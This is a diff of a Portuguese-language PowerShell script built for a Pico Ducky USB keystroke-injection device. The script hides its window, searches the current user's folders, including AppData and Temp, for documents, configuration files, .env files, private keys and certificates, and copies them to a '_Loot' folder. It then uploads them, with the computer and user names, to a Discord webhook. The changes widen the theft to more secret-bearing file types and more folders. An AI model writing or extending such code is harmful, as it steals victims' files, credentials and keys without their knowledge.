@@ -2,8 +2,9 @@
 .SYNOPSIS
     Coleta arquivos de um computador e envia para um webhook do Discord.
 .DESCRIPTION
-    Aguarda a conexão de um USB, coleta arquivos de pastas comuns,
-    limita a 10 arquivos por lote e 8MB por arquivo, e envia para o Discord.
+    Aguarda a conexão de um USB, coleta arquivos de pastas do usuário atual
+    (incluindo Temp, AppData\Local, AppData\Roaming), limita a 10 arquivos
+    por lote e 8MB por arquivo, e envia para o Discord.
 .NOTES
     Autor: Adaptado para Pico Ducky
     Limites: 10 arquivos/lote, 8MB/arquivo
@@ -71,11 +72,18 @@ function Send-FilesToDiscord {
                 }
                 
                 # Se for um arquivo de texto pequeno, envia como mensagem
-                if ($file.Length -lt 2000 -and ($file.Extension -in '.txt','.log','.json','.cfg','.conf','.xml','.ini')) {
+                if ($file.Length -lt 2000 -and ($file.Extension -in '.txt','.log','.json','.cfg','.conf','.xml','.ini','.yaml','.config','.env','.csv','.forms')) {
                     $content = Get-Content -Path $file.FullName -Raw -ErrorAction SilentlyContinue
                     if ($content) {
+                        # Limita o conteúdo a 1900 caracteres
+                        $truncatedContent = if ($content.Length -gt 1900) {
+                            $content.Substring(0, 1900) + "... [truncado]"
+                        } else {
+                            $content
+                        }
+                        
                         $body = @{
-                            content = "**📄 $($file.Name)**`n```$($content.Substring(0, [Math]::Min(1900, $content.Length)))```"
+                            content = "**📄 $($file.Name)**`n```$truncatedContent```"
                         } | ConvertTo-Json
                         
                         Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType 'application/json'
@@ -193,15 +201,43 @@ $drive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } |
 $driveLetter = $drive.DeviceID
 Write-Host "Drive de destino: $driveLetter/" -ForegroundColor Green
 
-$fileExtensions = @("*.log", "*.db", "*.txt", "*.json", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf")
+# ============= NOVAS EXTENSÕES =============
+$fileExtensions = @(
+    # Extensões originais
+    "*.log", "*.db", "*.txt", "*.json", "*.doc", "*.pdf", 
+    "*.jpg", "*.jpeg", "*.png", "*.cer", "*.key", "*.xls", 
+    "*.xlsx", "*.cfg", "*.conf",
+    # Novas extensões de documentos
+    "*.docx", "*.pptx", "*.ppt", "*.ppsx", "*.pptm", "*.potx",
+    # Arquivos de configuração e código
+    "*.env", "*.yaml", "*.config", "*.csv", "*.forms",
+    # Certificados e chaves
+    "*.pem", "*.crt", "*.pkcs12", "*.pfx"
+)
+
+# ============= NOVAS PASTAS (APENAS USUÁRIO ATUAL) =============
 $foldersToSearch = @(
+    # Pastas originais
     "$env:USERPROFILE\Documents",
     "$env:USERPROFILE\Desktop", 
     "$env:USERPROFILE\Downloads",
     "$env:USERPROFILE\OneDrive",
     "$env:USERPROFILE\Pictures",
-    "$env:USERPROFILE\Videos"
+    "$env:USERPROFILE\Videos",
+    # NOVAS PASTAS
+    "$env:USERPROFILE\AppData\Local",
+    "$env:USERPROFILE\AppData\Roaming",
+    "$env:USERPROFILE\AppData\Local\Temp",
+    "$env:TEMP"  # Caminho alternativo para Temp
 )
+
+# Remove pastas que não existem
+$foldersToSearch = $foldersToSearch | Where-Object { Test-Path $_ }
+
+Write-Host "Pastas a serem pesquisadas:" -ForegroundColor Cyan
+foreach ($folder in $foldersToSearch) {
+    Write-Host "  - $folder" -ForegroundColor Gray
+}
 
 $destinationPath = "$driveLetter\$env:COMPUTERNAME`_Loot"
 
@@ -217,6 +253,7 @@ Hide-Window
 $driveIndex = 0
 $collectedFiles = @()
 $skippedLargeFiles = 0
+$totalFilesFound = 0
 
 Write-Host "Coletando arquivos (máx. 8MB por arquivo)..." -ForegroundColor Cyan
 
@@ -226,44 +263,66 @@ foreach ($folder in $foldersToSearch) {
     Write-Host "Procurando em: $folder" -ForegroundColor Gray
     
     foreach ($extension in $fileExtensions) {
-        $files = Get-ChildItem -Path $folder -Recurse -Filter $extension -File -ErrorAction SilentlyContinue
-        
-        foreach ($file in $files) {
-            # Verifica tamanho do arquivo (máx. 8MB)
-            if ($file.Length -gt $maxFileSizeBytes) {
-                Write-Host "Arquivo ignorado (>8MB): $($file.Name) ($([math]::Round($file.Length / 1MB, 1)) MB)" -ForegroundColor Yellow
-                $skippedLargeFiles++
-                continue
-            }
+        try {
+            $files = Get-ChildItem -Path $folder -Recurse -Filter $extension -File -ErrorAction SilentlyContinue
             
-            $driveIndex++
-            
-            # Verifica se o USB ainda está conectado a cada 30 arquivos
-            if ($driveIndex -gt 30) {
-                $drive = Get-Volume -DriveLetter $driveLetter.trimEnd(":")
-                if (-not $drive) {
-                    Write-Host "USB desconectado! Encerrando..." -ForegroundColor Red
-                    exit
+            foreach ($file in $files) {
+                $totalFilesFound++
+                
+                # Verifica tamanho do arquivo (máx. 8MB)
+                if ($file.Length -gt $maxFileSizeBytes) {
+                    Write-Host "Arquivo ignorado (>8MB): $($file.Name) ($([math]::Round($file.Length / 1MB, 1)) MB)" -ForegroundColor Yellow
+                    $skippedLargeFiles++
+                    continue
                 }
-                $driveIndex = 0
+                
+                $driveIndex++
+                
+                # Verifica se o USB ainda está conectado a cada 30 arquivos
+                if ($driveIndex -gt 30) {
+                    $drive = Get-Volume -DriveLetter $driveLetter.trimEnd(":")
+                    if (-not $drive) {
+                        Write-Host "USB desconectado! Encerrando..." -ForegroundColor Red
+                        exit
+                    }
+                    $driveIndex = 0
+                }
+                
+                # Copia para o USB
+                $destinationFile = Join-Path -Path $destinationPath -ChildPath $file.Name
+                
+                # Se o arquivo já existe, adiciona um número ao nome
+                if (Test-Path $destinationFile) {
+                    $baseName = [System.IO.Path]::GetFileNameWithoutExtension($file.Name)
+                    $extension2 = [System.IO.Path]::GetExtension($file.Name)
+                    $counter = 1
+                    do {
+                        $newName = "$baseName`_$counter$extension2"
+                        $destinationFile = Join-Path -Path $destinationPath -ChildPath $newName
+                        $counter++
+                    } while (Test-Path $destinationFile)
+                }
+                
+                Copy-Item -Path $file.FullName -Destination $destinationFile -Force -ErrorAction SilentlyContinue
+                $collectedFiles += $destinationFile
             }
-            
-            # Copia para o USB
-            $destinationFile = Join-Path -Path $destinationPath -ChildPath $file.Name
-            Copy-Item -Path $file.FullName -Destination $destinationFile -Force -ErrorAction SilentlyContinue
-            $collectedFiles += $destinationFile
+        }
+        catch {
+            Write-Host "Erro ao acessar $folder : $_" -ForegroundColor Red
         }
     }
 }
 
-Write-Host "Arquivos coletados: $($collectedFiles.Count)" -ForegroundColor Green
+Write-Host "`nResumo da coleta:" -ForegroundColor Cyan
+Write-Host "  Total de arquivos encontrados: $totalFilesFound" -ForegroundColor White
+Write-Host "  Arquivos coletados (<=8MB): $($collectedFiles.Count)" -ForegroundColor Green
 if ($skippedLargeFiles -gt 0) {
-    Write-Host "Arquivos ignorados (>8MB): $skippedLargeFiles" -ForegroundColor Yellow
+    Write-Host "  Arquivos ignorados (>8MB): $skippedLargeFiles" -ForegroundColor Yellow
 }
 
 # --- Passo 5: Enviar para o Discord (em lotes de 10) ---
 if ($collectedFiles.Count -gt 0 -and $webhookUrl -ne "SEU_WEBHOOK_URL_AQUI") {
-    Write-Host "Enviando para o Discord (máx. $maxFilesPerBatch arquivos por lote)..." -ForegroundColor Cyan
+    Write-Host "`nEnviando para o Discord (máx. $maxFilesPerBatch arquivos por lote)..." -ForegroundColor Cyan
     
     $result = Send-FilesToDiscord -FolderPath $destinationPath -WebhookUrl $webhookUrl -MaxFiles $maxFilesPerBatch -MaxSizeBytes $maxFileSizeBytes
     
@@ -271,9 +330,10 @@ if ($collectedFiles.Count -gt 0 -and $webhookUrl -ne "SEU_WEBHOOK_URL_AQUI") {
     $summaryMessage = @{
         content = "✅ **Coleta concluída!**`n" +
                   "📁 Pasta: $destinationPath`n" +
-                  "📄 Arquivos coletados: $($collectedFiles.Count)`n" +
-                  "📤 Arquivos enviados: $($result.sent)`n" +
-                  "⏭️ Arquivos ignorados (>8MB): $($result.skipped + $skippedLargeFiles)`n" +
+                  "📄 Total encontrado: $totalFilesFound`n" +
+                  "📄 Coletados: $($collectedFiles.Count)`n" +
+                  "📤 Enviados: $($result.sent)`n" +
+                  "⏭️ Ignorados (>8MB): $($result.skipped + $skippedLargeFiles)`n" +
                   "💻 Computador: $env:COMPUTERNAME`n" +
                   "👤 Usuário: $env:USERNAME"
     } | ConvertTo-Json
@@ -288,11 +348,11 @@ if ($collectedFiles.Count -gt 0 -and $webhookUrl -ne "SEU_WEBHOOK_URL_AQUI") {
 }
 else {
     if ($webhookUrl -eq "SEU_WEBHOOK_URL_AQUI") {
-        Write-Host "Webhook não configurado! Arquivos salvos em: $destinationPath" -ForegroundColor Red
+        Write-Host "`nWebhook não configurado! Arquivos salvos em: $destinationPath" -ForegroundColor Red
     } else {
-        Write-Host "Nenhum arquivo coletado." -ForegroundColor Yellow
+        Write-Host "`nNenhum arquivo coletado." -ForegroundColor Yellow
     }
 }
 
-Write-Host "Script finalizado!" -ForegroundColor Green
+Write-Host "`nScript finalizado!" -ForegroundColor Green
 Start-Sleep 2
